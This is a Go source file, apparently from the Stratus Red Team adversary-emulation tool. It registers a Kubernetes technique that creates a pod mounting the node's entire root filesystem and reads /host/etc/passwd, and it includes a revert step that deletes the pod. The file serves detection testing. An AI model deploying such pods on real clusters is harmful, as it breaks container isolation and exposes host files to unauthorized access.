package kubernetes

import (
	"context"
	"errors"
	"github.com/aws/smithy-go/ptr"
	v1 "k8s.io/api/core/v1"
	"log"

	_ "embed"

	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.privilege-escalation.hostpath-volume",
		FriendlyName:       "Container breakout via hostPath volume mount",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		Description: `
Creates a Pod with the entire node root filesystem as a hostPath volume mount

Warm-up: 

- Creates the Stratus Red Team namespace

Detonation: 

- Create a privileged busybox pod with the node root filesystem mounted at "/host" 
	that reads "/etc/passwd" from the host filesystem
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podSpec := nodeRootPodSpec(namespace)

	log.Println("Creating malicious pod " + podSpec.ObjectMeta.Name)
	_, err := client.CoreV1().Pods(namespace).Create(context.Background(), podSpec, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create pod: " + err.Error())
	}

	log.Println("Pod " + podSpec.ObjectMeta.Name + " created in namespace " + namespace)
	return nil
}

func revert(params map[string]string) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podSpec := nodeRootPodSpec(namespace)

	log.Println("Removing malicious pod " + podSpec.ObjectMeta.Name)
	deleteOptions := metav1.DeleteOptions{GracePeriodSeconds: ptr.Int64(0)}
	err := client.CoreV1().Pods(namespace).Delete(context.Background(), podSpec.ObjectMeta.Name, deleteOptions)
	if err != nil {
		return errors.New("unable to remove pod: " + err.Error())
	}

	return nil
}

func nodeRootPodSpec(namespace string) *v1.Pod {
	return &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "k8s.privilege-escalation.hostpath-volume",
			Namespace: namespace,
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "busybox",
					Image: "busybox:stable",
					Command: []string{
						"sh", "-c",
					},
					Args: []string{
						"cat /host/etc/passwd && while true; do sleep 3600; done", // print /host/etc/password and hang
					},

					VolumeMounts: []v1.VolumeMount{
						{
							Name:      "hostfs",
							MountPath: "/host",
						},
					},
				},
			},
			Volumes: []v1.Volume{
				{
					Name: "hostfs",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/",
						},
					},
				},
			},
		},
	}
}
